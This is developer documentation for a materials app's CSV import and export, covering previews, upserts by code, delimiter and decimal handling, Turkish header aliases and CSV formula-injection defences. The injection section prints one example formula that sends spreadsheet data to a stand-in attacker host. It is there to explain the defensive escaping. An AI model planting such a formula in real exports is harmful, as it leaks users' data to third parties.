# Import and export

`packages/shared/src/engine/importer.ts`. In the app: **Materials → Template /
Import / Export**.

## Flow

1. **Template** downloads a header row for the collection.
2. **Import** reads a CSV and shows a **preview** — nothing is written yet.
3. The preview reports what would be created, what would be updated, and what
   would be skipped, with row-level errors and warnings kept separate.
4. **Import** commits.

The preview is the point. A spreadsheet from a supplier is full of surprises — a
decimal comma, a merged header, a blank code — and committing it blind means
discovering the damage afterwards, in the material library everyone depends on.

## Idempotent on the code

Rows are matched on the stable code. Re-running the same file **updates** rather
than creating a second copy of the factory's material library. A row with no
code is refused, because matching depends on it, and a code repeated inside one
file is refused too.

Append-only collections (prices, exchange rates, cost snapshots) reject an
existing code outright, with an explanatory error, rather than overwriting a
historical record.

## Partial import

If some rows fail, nothing is written until you tick **Import the N valid rows
and skip the M that failed**. Failed rows are never written, whatever you
choose.

## Spreadsheet formula injection

A cell beginning `=`, `+`, `-`, `@`, tab or carriage return is executable in
Excel, LibreOffice and Google Sheets. A material name of

```
=HYPERLINK("http://attacker.example/?"&A1,"Click for pricing")
```

exfiltrates the row it sits next to the moment someone opens the export.

- **Export** prefixes any such cell with an apostrophe. The cell shows its
  literal text and the formula engine never sees it. Plain numbers, including
  negative ones, are left alone so numeric columns still work.
- **Import** strips a leading trigger rather than trusting it. A leading
  apostrophe means the cell was escaped by a previous export, so the rest is
  restored as the literal value.

Stored values are inert either way — they are data in a JSON file — and any
later export re-escapes them.

## Imports are data, not instructions

An import is an actor of kind `import`, which `canTransitionTo` refuses approval
to unconditionally. Nothing in a spreadsheet can grant an approval, set an
approved status, or change a rule. A file claiming `production_approved` was
signed somewhere FormuLab cannot audit; it must be granted again, by a person,
inside FormuLab.

## Format

Delimiter is detected from the header line: `,`, `;`, tab or `|`.
Semicolon-delimited is the default Excel export in locales that use a decimal
comma, which includes most of the ones this factory buys from.

A UTF-8 BOM is stripped on import (Excel writes one, and it otherwise becomes
part of the first header name, which then matches nothing) and written on export
so Excel opens the file as UTF-8.

Quoted fields, embedded delimiters, embedded newlines and doubled quotes are
handled per RFC 4180.

Both decimal conventions are read — see
[PRECISION_POLICY.md](PRECISION_POLICY.md#human-input).

## Headings

Headings are matched loosely (case, spaces, underscores, dots and hyphens are
ignored) against the canonical field name and a list of aliases, including
Turkish ones. Unrecognised columns are reported, not silently dropped.

**Materials** — `code` and `displayName` required. Aliases include
`material code` / `kod` / `malzeme kodu`, `name` / `malzeme`,
`active matter` / `aktif madde`, `density` / `yogunluk` / `specific gravity`,
`function` / `islev`, `cas`, `hlb`, `technical max` / `teknik maks`.

**Suppliers** — `code`, `displayName` required. `tedarikci`, `ulke`, `eposta`,
`telefon`, `para birimi`, `odeme`, `lead time`.

**Prices** — `code`, `materialCode`, `price`, `currency`, `effectiveFrom`
required. `fiyat`, `tarih`, `navlun` (freight), `gumruk` (duty), `vergi` (tax),
`liman` (port), `sigorta` (insurance), `teklif` (quotation).

**Inventory** — `code`, `materialCode`, `quantity` required. `depo`, `parti`,
`miktar`, `uretim tarihi`, `skt` (expiry).

**Material–supplier links**, **substitutes** and **material functions** have
schemas (`MATERIAL_SUPPLIER_FIELDS`, `SUBSTITUTE_FIELDS`,
`MATERIAL_FUNCTION_FIELDS`) but no UI tab yet.

## Field types

| Kind | Behaviour |
| --- | --- |
| `text` | Trimmed |
| `decimal` | Both conventions; a non-number is a row error |
| `integer` | Digits only; a non-integer is a row error |
| `boolean` | `y`, `yes`, `true`, `1`, `evet`, `ja`, `oui` are true |
| `list` | Split on `;`, `,` or `\|` |

## Export

Exports the current filtered view as CSV, with the canonical field names as
headers and every cell neutralised.

## Known limitations

- CSV only. There is no `.xlsx` reader or writer — save the sheet as CSV first.
  (`xlsx` is bundled for the file viewer but not wired into this path.)
- No column-mapping UI for headings the aliases do not cover; rename the column
  in the sheet.
- No import undo. The collection is backed up before destructive operations, but
  an import is an upsert and is not automatically reversible.
